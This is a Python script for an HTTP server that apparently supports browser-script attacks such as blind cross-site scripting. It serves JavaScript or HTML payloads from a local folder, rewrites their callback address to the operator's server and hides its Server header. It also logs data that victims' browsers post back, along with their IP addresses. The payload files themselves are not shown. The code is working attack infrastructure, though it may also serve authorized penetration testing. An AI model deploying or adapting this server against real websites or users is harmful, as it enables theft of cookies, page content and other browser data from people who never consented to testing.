from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from sys import argv
from os import listdir
from os.path import isfile, join


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        success = False
        if self.path.startswith('/api/payload') :
            query_components = parse_qs(urlparse(self.path).query)
            name = query_components.get('name', [''])[0]
            ct = query_components.get('ct', [''])[0]
            self.send_response(200)
            self.send_header('Server', None)
            self.send_header('Content-type', 'text/html' if ct != 'js' else 'text/javascript')
            self.end_headers()
            if name in payloads:
                self.wfile.write(payloads[name].encode())
                success = True
        if not success:
            return self._404()
    
    def _404(self):
        self.send_response(404)
        self.send_header('Server', None)
        self.end_headers()

    def do_POST(self):
        if self.path.startswith('/api/result'):
            query_components = parse_qs(urlparse(self.path).query)
            name = query_components.get('name', [''])[0]
            if not name in payloads:
                return self._404()

            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            client_ip = self.client_address[0]
            print(f"[*][{client_ip}] {name} - {str(post_data)}  ")
            self.send_response(200)
            self.send_header('Server', None)
            self.end_headers()

def prepare_payloads():
    base_path = 'payloads/'
    for file_name in listdir(base_path):
        file_path = join(base_path, file_name)
        if isfile(file_path):
            with open(file_path, 'r', encoding='utf-8') as file:
                payloads[file_name] = str(file.read()).replace('127.0.0.1:8080', f'{server_ip}:{http_port}')

def run():
    server_address = ('0.0.0.0', http_port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    try:
        print(f'HTTP server started on port {http_port}')
        httpd.serve_forever()
    finally:
        httpd.server_close()

if __name__ == '__main__':
    if len(argv) != 3 or not argv[2].isnumeric():
        raise Exception("Usage ./server.py <SERVER_IP> <HTTP_PORT>")

    global server_ip
    global http_port
    global results
    global payloads
    server_ip = argv[1]
    http_port = int(argv[2])
    results = {}
    payloads = {}

    prepare_payloads()
    run()
